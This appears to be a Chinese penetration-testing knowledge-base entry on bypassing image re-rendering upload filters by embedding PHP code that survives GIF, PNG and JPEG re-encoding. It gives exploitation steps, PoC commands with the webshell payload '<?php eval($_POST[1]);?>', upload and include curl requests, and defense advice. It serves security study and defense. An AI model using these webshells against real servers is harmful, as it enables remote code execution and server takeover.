---
id: web-generic-file-upload-image-render-payload-survival
title: 图片二次渲染上传：把 PHP 载荷写进渲染后仍保留的像素/数据块
type: scenario
domain: web
path: web/generic/file-upload
technique: image-render-payload-bypass
aliases:
- 二次渲染绕过
- 图片马
- imagecreatefrom 绕过
- PNG PLTE 图片马
- jpg_payload
- GIF 图片马
tags:
- web
- file-upload
- image
- php
- gif
- png
- jpeg
- file-inclusion
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V9
  verified_at: '2026-11-05T00:40:30+08:00'
  notes: 已对照原文文字核对：GIF 尾部载荷被渲染剔除，需放到渲染后保留区域；PNG 仅索引色可用 PLTE，IDAT 方案需短标签；JPEG 先渲染再用 jpg_payload 插入载荷；最终均配合文件包含执行。原文后半段相关截图为外链、抓取器未本地留存，按文字结论核对，confidence=medium 合理。原文未涉及版本区间。PoC 未在本机执行。
---

## 一句话结论

后端用 `imagecreatefromgif/png/jpeg` 重新渲染图片并保存渲染结果时，普通追加在文件尾的 PHP 代码会被丢弃；把载荷写进渲染后仍被保留的 GIF 注释区、PNG PLTE/IDAT 像素或 JPEG 结构，再配合文件包含即可执行。

## 原理

- `imagecreatefrom*()` 读取图片像素后创建一个新图像，`image*()` 再按格式重新编码写出，原文件中的尾部附加数据、注释和未知块大多被丢弃。
- 但渲染并非“只保留像素”这么绝对：GIF 的部分注释/扩展块、PNG 的调色板（PLTE）与像素数据（IDAT）、JPEG 的段结构在重新编码后可能保留，取决于图片类型与编码器实现。
- 因此绕过思路不是“让校验通过”，而是“让载荷成为图片数据的一部分，使重编码后仍然存在”。攻击者需要先上传一次，下载渲染结果，用十六进制对比找出被保留的区域，再把载荷放到相同位置。
- 图片本身不会执行代码；最终需要目标存在文件包含（LFI）或把图片当 PHP 解析的入口，才能执行图片中的 PHP 代码。

## 触发条件

- 上传接口对图片调用 `imagecreatefrom*()` 二次渲染，并保存渲染后的图片。
- 上传目录或包含点允许把图片内容当作 PHP 解析（常配合 LFI）。
- 对应图片格式的重编码保留了可写入载荷的区域；PNG 的 PLTE 方案仅适用于索引色图像。

## 利用步骤

1. 上传一张正常图片，下载服务器返回的渲染结果。
2. 用十六进制对比原图与渲染图，标出内容完全一致的区域（渲染后仍保留的块/像素）。
3. 按格式生成携带 PHP 载荷的图片：
   - GIF：把 `<?php ... ?>` 写入对比后仍保留的注释/空白区域，重新上传；
   - PNG：将图片转为索引色，用 PLTE 注入脚本生成图片；若首次上传后载荷错位，把下载的渲染图再次上传渲染一次；或使用 IDAT 像素写入方案（需目标开启短标签）；
   - JPEG：先把图片上传渲染一次，下载渲染结果，再用 `jpg_payload` 把载荷插入该 JPEG 的结构。
4. 上传生成的图片，下载确认载荷仍存在。
5. 通过文件包含访问图片路径，执行其中的 PHP。

## PoC

PNG PLTE 方案（索引色图片）：

```bash
python poc_png.py -p '<?php eval($_POST[1]);?>' -o shell.png guo.png
curl -s -X POST 'http://target/upload.php' -F 'file=@shell.png;filename=shell.png;type=image/png'
```

JPEG 方案：在 `jpg_payload` 中设置最小 payload 后，以其渲染后的 JPEG 为输入生成图片：

```php
$miniPayload = '<?php $_GET[0]($_POST[1]);?>';
```

GIF 方案：用十六进制编辑器把一句话写入渲染后仍保持不变的区域，再上传。

最终包含：

```bash
curl -s 'http://target/include.php?file=upload/shell.png&1=phpinfo();'
```

## 变体与关联

- 变体：GIF 的载荷若被剔除，可换图或改用渲染后保留的注释块；PNG 只有索引图像能稳定写 PLTE，灰度和真彩图失败；JPEG 成功率与图片大小、payload 长度有关，短 payload 成功率更高。
- 关联：[[web-generic-file-upload-save-then-validate-race]]（渲染前原图短暂落盘，可抢先访问）；[[web-generic-file-upload-magic-byte-gif-prefix-bypass]]（不渲染时只需前缀）；[[web-php-file-inclusion-thinkphp-view-template]]（图片马配合包含的实例）。
- 边界：本手法依赖文件包含/解析入口，单独上传图片不会执行；原文对 PNG/JPEG 的成功率描述为需要多次尝试，置信度定为 medium。

## 检测与防御

- 检测：上传图片中存在 PHP 标签、`eval`、`$_POST` 等脚本特征；图片被包含执行时产生异常 PHP 错误；上传接口出现同一图片反复上传/下载的行为。
- 防御：对图片重新编码后再落盘，并对编码结果做内容扫描；上传目录禁止脚本解析且不与包含点共用路径；文件包含使用固定白名单而非用户可控路径；禁用短标签。
